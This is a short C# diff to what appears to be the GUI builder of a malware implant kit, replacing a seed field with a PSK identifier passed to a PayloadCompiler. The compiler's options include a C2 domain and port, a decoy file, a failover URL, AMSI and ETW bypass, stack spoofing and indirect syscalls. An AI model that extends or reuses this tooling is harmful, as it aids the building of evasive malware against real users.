@@ -121,7 +121,7 @@ namespace Builder_GUI
                 // Grab the values from the text boxes
                 string domain = txtDomain.Text;
                 string port = txtPort.Text;
-                string seed = txtSeed.Text;
+                string pskId = txtPskId.Text.Trim();
                 string decoyFile = txtDecoy.Text == "Drop or select file..." ? "" : txtDecoy.Text;
                 
                 // Collect selected atoms
@@ -159,7 +159,7 @@ namespace Builder_GUI
                 bool enableSpoof = chkSpoof.IsChecked == true;
                 
                 // Since dotnet run executes in Builder_GUI, the root is one level up
-                PayloadCompiler compiler = new PayloadCompiler("..", ".\\Output", decoyFile, domain, port, seed, selectedAtoms.ToArray(), autoStartOrder, failoverUrl, enableEtw, enableAmsi, enableStack, enablePayload, enableIndirect, enableIpc, enableProxy, enableManager, enableVeh, enableCleanup, enableBloat, enableSpoof);
+                PayloadCompiler compiler = new PayloadCompiler("..", ".\\Output", decoyFile, domain, port, selectedAtoms.ToArray(), autoStartOrder, failoverUrl, enableEtw, enableAmsi, enableStack, enablePayload, enableIndirect, enableIpc, enableProxy, enableManager, enableVeh, enableCleanup, enableBloat, enableSpoof, pskId);
                 
                 // Use Task.Run to keep the UI thread responsive
                 bool success = await Task.Run(() => compiler.BuildPayload());
